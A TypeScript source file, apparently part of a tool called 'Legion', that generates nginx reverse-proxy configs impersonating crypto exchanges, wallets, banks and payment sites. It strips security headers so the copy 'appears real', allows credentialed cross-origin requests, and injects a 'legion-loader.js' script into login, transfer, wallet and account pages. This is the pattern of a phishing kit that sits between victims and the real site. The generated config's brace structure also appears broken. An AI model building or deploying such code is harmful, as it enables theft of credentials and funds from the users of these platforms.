/**
 * NGINX Reverse Proxy Generator
 *
 * Generates nginx.conf for dynamic proxy-based extraction
 * Replaces static HTML cloning with live proxying
 *
 * Input: URL + Platform info
 * Output: Production-ready nginx.conf
 */

import { writeFileSync, mkdirSync } from 'node:fs'
import path from 'node:path'

export interface NginxConfig {
  targetUrl: string
  targetHost: string
  targetPort: number
  listenPort: number
  platformCategory: 'cex' | 'dex' | 'wallet' | 'bank' | 'fintech' | 'bridge' | 'lending'
  injectionPoints: string[]
  headerRules: Record<string, string>
  cookieHeaders?: string
}

export interface NginxResult {
  configPath: string
  success: boolean
  message: string
}

export class NginxGenerator {
  private config: NginxConfig

  constructor(config: NginxConfig) {
    this.config = config
  }

  generate(outputDir: string): NginxResult {
    try {
      console.error(`[nginx-generator] Generating nginx config for ${this.config.targetUrl}`)

      // Create output directory
      mkdirSync(outputDir, { recursive: true })

      const nginxConfig = this.buildNginxConfig()
      const configPath = path.join(outputDir, 'nginx.conf')

      writeFileSync(configPath, nginxConfig, 'utf8')

      console.error(`[nginx-generator] ✅ Config generated: ${configPath}`)

      return {
        configPath,
        success: true,
        message: 'nginx.conf generated successfully',
      }
    } catch (error) {
      const msg = error instanceof Error ? error.message : String(error)
      console.error(`[nginx-generator] ❌ Error: ${msg}`)
      return {
        configPath: '',
        success: false,
        message: msg,
      }
    }
  }

  private buildNginxConfig(): string {
    const baseConfig = this.getBaseConfig()
    const locationBlock = this.buildLocationBlock()
    const injectionRules = this.buildInjectionRules()

    return `${baseConfig}\n\n${locationBlock}\n\n${injectionRules}`
  }

  private getBaseConfig(): string {
    return `# Legion Nginx Proxy - ${this.config.platformCategory.toUpperCase()}
# Auto-generated for ${this.config.targetUrl}
# Generated: ${new Date().toISOString()}

worker_processes 1;
events { worker_connections 2048; }

http {
  include /etc/nginx/mime.types;
  default_type application/octet-stream;
  sendfile on;
  keepalive_timeout 65;
  proxy_connect_timeout 60s;
  proxy_send_timeout 120s;
  proxy_read_timeout 120s;
  proxy_buffering off;
  gzip off;

  server {
    listen ${this.config.listenPort};
    server_name localhost 127.0.0.1;

    large_client_header_buffers 8 1m;
`
  }

  private buildLocationBlock(): string {
    const { targetHost, targetPort } = this.config
    const targetUrl = targetPort === 443 ? `https://${targetHost}` : `http://${targetHost}:${targetPort}`

    let headerRules = ''
    for (const [key, value] of Object.entries(this.config.headerRules)) {
      headerRules += `      proxy_set_header ${key} "${value}";\n`
    }

    let cookieHeader = ''
    if (this.config.cookieHeaders) {
      cookieHeader = `      proxy_set_header Cookie "${this.config.cookieHeaders}";\n`
    }

    return `    location / {
      proxy_pass ${targetUrl};
      proxy_ssl_server_name on;
      proxy_set_header Host ${targetHost};
      proxy_redirect off;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection upgrade;

      # Real browser headers
      proxy_set_header Accept-Encoding "";
      proxy_buffering on;
      proxy_buffer_size 256k;
      proxy_buffers 256 16k;
      proxy_max_temp_file_size 2048m;
      proxy_temp_file_write_size 256k;

${headerRules}${cookieHeader}
      # Hide security headers to appear real
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;
      proxy_hide_header Cross-Origin-Embedder-Policy;
      proxy_hide_header Cross-Origin-Opener-Policy;
      proxy_hide_header Cross-Origin-Resource-Policy;
      proxy_hide_header Permissions-Policy;

      # Add CORS headers
      add_header Access-Control-Allow-Origin $http_origin always;
      add_header Access-Control-Allow-Credentials true always;
      add_header Access-Control-Allow-Methods "GET, POST, OPTIONS, PUT, DELETE, HEAD, PATCH" always;
      add_header Access-Control-Allow-Headers "*" always;

      if ($request_method = 'OPTIONS') {
        add_header Access-Control-Allow-Origin $http_origin;
        add_header Access-Control-Allow-Credentials "true";
        add_header Access-Control-Allow-Methods "GET, POST, OPTIONS, PUT, DELETE, HEAD, PATCH";
        add_header Access-Control-Allow-Headers "*";
        add_header Access-Control-Max-Age 1728000;
        add_header Content-Type "text/plain charset=UTF-8";
        add_header Content-Length 0;
        return 204;
      }
    }
  }
}`
  }

  private buildInjectionRules(): string {
    const injectionPoints = this.config.injectionPoints.join('|')

    return `    # Script injection for key pages
    location ~ ^/(${injectionPoints})/?$ {
      proxy_pass https://${this.config.targetHost};
      proxy_ssl_server_name on;
      proxy_set_header Host ${this.config.targetHost};
      proxy_redirect off;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection upgrade;

      gzip off;
      proxy_set_header Accept-Encoding "";
      proxy_buffering on;
      proxy_buffer_size 256k;
      proxy_buffers 256 16k;

      # Inject legion scripts
      sub_filter_types text/html;
      sub_filter '</head>' '<script src="/legion-loader.js"></script></head>';
      sub_filter_once on;

      proxy_hide_header Content-Security-Policy;
      proxy_hide_header Content-Security-Policy-Report-Only;
      proxy_hide_header X-Frame-Options;
      proxy_hide_header X-Content-Type-Options;

      add_header Content-Security-Policy "default-src * 'unsafe-inline' 'unsafe-eval' blob: data:; script-src * 'unsafe-inline' 'unsafe-eval' blob: data:; style-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline' blob: data: http: https: ws: wss:;" always;
    }
  }
}`
  }
}

// Helper function to detect platform category
export function detectPlatformCategory(url: string): 'cex' | 'dex' | 'wallet' | 'bank' | 'fintech' | 'bridge' | 'lending' {
  const hostname = new URL(url).hostname.toLowerCase()

  // CEX patterns
  if (/binance|coinbase|kraken|bybit|okx|mexc|huobi|kucoin/.test(hostname)) return 'cex'

  // DEX patterns
  if (/uniswap|curve|pancakeswap|aave|lido|1inch|opensea/.test(hostname)) return 'dex'

  // Wallet patterns
  if (/metamask|phantom|ledger|trezor|trust|wallet/.test(hostname)) return 'wallet'

  // Bank patterns
  if (/bank|banking|credit|payment/.test(hostname)) return 'bank'

  // Fintech patterns
  if (/fintech|stripe|paypal|revolut|wise/.test(hostname)) return 'fintech'

  // Bridge patterns
  if (/bridge|stargate|across|hop|synapse|connext/.test(hostname)) return 'bridge'

  // Lending patterns
  if (/aave|compound|yearn|maker|convex|lend/.test(hostname)) return 'lending'

  return 'dex' // Default to DEX
}

// Helper to get browser headers for platform
export function getBrowserHeaders(platformCategory: string): Record<string, string> {
  return {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Sec-CH-UA': '"Chromium";v="122", "Google Chrome";v="122", "Not-A.Brand";v="99"',
    'Sec-CH-UA-Mobile': '?0',
    'Sec-CH-UA-Platform': '"Windows"',
    'Referer': 'https://www.google.com/',
  }
}

// Get injection points based on platform
export function getInjectionPoints(platformCategory: string): string[] {
  const points: Record<string, string[]> = {
    dex: ['swap', 'pool', 'tokens', 'farms', 'governance'],
    cex: ['trade', 'account', 'wallet', 'portfolio', 'settings'],
    wallet: ['account', 'settings', 'dashboard'],
    bank: ['login', 'accounts', 'transfer', 'settings'],
    fintech: ['dashboard', 'send', 'settings'],
    bridge: ['bridge', 'swap', 'liquidity'],
    lending: ['borrow', 'lend', 'dashboard'],
  }

  return points[platformCategory] || points.dex
}
